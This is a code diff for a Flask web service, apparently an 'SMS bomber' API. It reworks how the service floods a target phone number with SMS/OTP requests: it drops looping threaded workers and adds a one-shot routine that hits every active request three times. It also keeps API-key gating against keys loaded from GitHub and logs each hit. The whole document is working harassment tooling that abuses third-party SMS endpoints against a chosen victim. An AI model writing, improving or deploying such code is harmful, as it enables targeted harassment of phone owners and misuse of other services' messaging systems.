@@ -6,7 +6,7 @@ import time
 import random
 import threading
 import requests as req_lib
-from datetime import datetime, timedelta
+from datetime import datetime
 from bs4 import BeautifulSoup
 import re
 
@@ -17,7 +17,6 @@ CORS(app)
 REQUESTS_FILE = 'requests/requests.json'
 STATS_FILE = 'requests/stats.json'
 LOGS_FILE = 'requests/logs.json'
-HISTORY_FILE = 'requests/history.json'
 KEYS_GITHUB_URL = 'https://raw.githubusercontent.com/gauravbeniwal3003-prog/sms-bomber-api/main/requests/keys.txt'
 
 # ===== LOAD DATA =====
@@ -39,12 +38,6 @@ def save_json(file, data):
 requests_data = load_json(REQUESTS_FILE, [])
 stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
 logs_data = load_json(LOGS_FILE, [])
-history_data = load_json(HISTORY_FILE, [])
-
-# ===== GLOBALS =====
-bombing_active = False
-bombing_threads = []
-bombing_lock = threading.Lock()
 active_keys = set()
 
 # ===== LOAD KEYS FROM GITHUB =====
@@ -58,10 +51,9 @@ def load_keys_from_github():
             print(f"✅ Loaded {len(active_keys)} keys from GitHub")
             return True
     except Exception as e:
-        print(f"❌ Failed to load keys from GitHub: {e}")
+        print(f"❌ Failed to load keys: {e}")
     return False
 
-# ===== KEY VALIDATION =====
 def validate_key(key):
     if not active_keys:
         load_keys_from_github()
@@ -130,7 +122,7 @@ def send_request(req, phone):
             else:
                 r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
         
-        with bombing_lock:
+        with stats_lock:
             stats_data['total_requests'] += 1
             if r.status_code in [200, 302, 201, 202]:
                 stats_data['success'] += 1
@@ -145,43 +137,67 @@ def send_request(req, phone):
                 save_json(STATS_FILE, stats_data)
                 return False
     except Exception as e:
-        with bombing_lock:
+        with stats_lock:
             stats_data['total_requests'] += 1
             stats_data['failed'] += 1
             save_json(STATS_FILE, stats_data)
         return False
 
-# ===== BOMBING WORKER — 3x HIT =====
-def bombing_worker(phone, req, thread_id):
-    global bombing_active
-    phone_variants = req.get('phones', [phone])
-    if not phone_variants:
-        phone_variants = [phone]
+# ===== ONE-SHOT BOMBING =====
+def one_shot_bombing(phone, key):
+    """Execute one round: 3x hits on all active requests"""
+    global stats_data
+    active_requests = [r for r in requests_data if r.get('active', True)]
     
-    while bombing_active:
-        target_phone = random.choice(phone_variants)
+    if not active_requests:
+        return {"error": "No active requests"}
+    
+    # Reset stats for this round
+    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
+    save_json(STATS_FILE, stats_data)
+    
+    total_hits = 0
+    success_hits = 0
+    
+    # For each active request
+    for req in active_requests:
+        phone_variants = req.get('phones', [phone])
+        target_phone = random.choice(phone_variants) if phone_variants else phone
         
-        # === 3 TIMES HIT ===
+        # 3 times hit
         for hit in range(3):
-            if not bombing_active:
-                break
             success = send_request(req, target_phone)
+            total_hits += 1
+            if success:
+                success_hits += 1
             
-            with bombing_lock:
+            # Log
+            with stats_lock:
                 log_entry = {
                     "time": datetime.now().isoformat(),
                     "request": req['name'],
                     "phone": target_phone,
                     "status": "success" if success else "failed",
-                    "thread": thread_id,
                     "hit": hit + 1
                 }
                 logs_data.append(log_entry)
                 save_json(LOGS_FILE, logs_data[-500:])
             
             time.sleep(0.01)  # Small delay between hits
-        
-        time.sleep(0.02)
+    
+    return {
+        "success": True,
+        "phone": phone,
+        "key": key,
+        "active_requests": len(active_requests),
+        "total_hits": total_hits,
+        "success_hits": success_hits,
+        "failed_hits": total_hits - success_hits,
+        "stats": stats_data
+    }
+
+# ===== GLOBALS =====
+stats_lock = threading.Lock()
 
 # ===== ROUTES =====
 
@@ -220,137 +236,53 @@ def get_logs():
     return jsonify(logs_data[-limit:])
 
 # ===== ===== ===== =====
-# ===== GET API — SIMPLE URL =====
+# ===== ONE-SHOT API =====
 # ===== ===== ===== =====
 @app.route('/api', methods=['GET'])
-def simple_api():
+def one_shot_api():
+    """GET /api?key=KEY&bomb=PHONE -> 3x hits on all active requests -> auto-stop"""
     key = request.args.get('key')
     phone = request.args.get('bomb')
     
     if not key:
         return jsonify({"error": "Missing 'key' parameter"}), 400
-    
-    # Validate key from GitHub
     if not validate_key(key):
         return jsonify({"error": "Invalid API key"}), 401
-    
     if not phone:
         return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
     if not re.match(r'^\+?[0-9]{10,15}$', phone):
         return jsonify({"error": "Invalid phone number format"}), 400
     
-    # Start bombing
-    global bombing_active, bombing_threads, stats_data
-    
-    if bombing_active:
-        return jsonify({"error": "Bombing already active"}), 400
-    
-    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
-    save_json(STATS_FILE, stats_data)
-    
-    bombing_active = True
-    bombing_threads = []
-    
-    active_requests = [r for r in requests_data if r.get('active', True)]
-    thread_id = 0
-    for req in active_requests:
-        for _ in range(2):  # 2 parallel threads per request
-            t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
-            t.daemon = True
-            t.start()
-            bombing_threads.append(t)
-            thread_id += 1
-    
-    return jsonify({
-        "success": True,
-        "message": f"Bombing started on {phone}",
-        "phone": phone,
-        "key": key,
-        "active_requests": len(active_requests),
-        "threads": len(bombing_threads),
-        "hits_per_request": 3
-    })
+    # Execute one-shot bombing
+    result = one_shot_bombing(phone, key)
+    return jsonify(result)
 
 @app.route('/api/stop', methods=['GET'])
 def simple_stop():
-    key = request.args.get('key')
-    if not key or not validate_key(key):
-        return jsonify({"error": "Invalid API key"}), 401
-    
-    global bombing_active
-    bombing_active = False
-    return jsonify({
-        "success": True,
-        "message": "Bombing stopped",
-        "stats": stats_data
-    })
+    """Optional stop - but not needed since one-shot auto-stops"""
+    return jsonify({"message": "One-shot bombing auto-stops after 3x hits. No stop needed."})
 
 @app.route('/api/bomb/start', methods=['POST'])
 def start_bombing_post():
-    global bombing_active, bombing_threads, stats_data
-    
+    """POST version of one-shot bombing"""
     data = request.json
     phone = data.get('phone')
     if not phone:
         return jsonify({"error": "Phone number required"}), 400
     
     api_key = data.get('api_key') or request.headers.get('X-API-Key')
-    if api_key and not validate_key(api_key):
+    if not api_key or not validate_key(api_key):
         return jsonify({"error": "Invalid API key"}), 401
     
-    if bombing_active:
-        return jsonify({"error": "Bombing already active"}), 400
-    
-    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
-    save_json(STATS_FILE, stats_data)
-    
-    bombing_active = True
-    bombing_threads = []
-    
-    active_requests = [r for r in requests_data if r.get('active', True)]
-    thread_id = 0
-    for req in active_requests:
-        for _ in range(2):
-            t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
-            t.daemon = True
-            t.start()
-            bombing_threads.append(t)
-            thread_id += 1
-    
-    return jsonify({
-        "success": True,
-        "message": f"Bombing started on {phone}",
-        "phone": phone,
-        "active_requests": len(active_requests),
-        "threads": len(bombing_threads),
-        "hits_per_request": 3
-    })
-
-@app.route('/api/bomb/stop', methods=['POST'])
-def stop_bombing_post():
-    global bombing_active
-    bombing_active = False
-    return jsonify({
-        "success": True,
-        "message": "Bombing stopped",
-        "stats": stats_data
-    })
-
-@app.route('/api/bomb/status', methods=['GET'])
-def bombing_status():
-    return jsonify({
-        "active": bombing_active,
-        "stats": stats_data,
-        "active_requests": sum(1 for r in requests_data if r.get('active', True)),
-        "threads": len(bombing_threads)
-    })
+    result = one_shot_bombing(phone, api_key)
+    return jsonify(result)
 
 @app.route('/admin')
 @app.route('/admin/')
 def serve_admin():
     return send_from_directory('../admin', 'index.html')
 
-# ===== LOAD KEYS ON STARTUP =====
+# ===== LOAD KEYS =====
 load_keys_from_github()
 
 app.debug = False
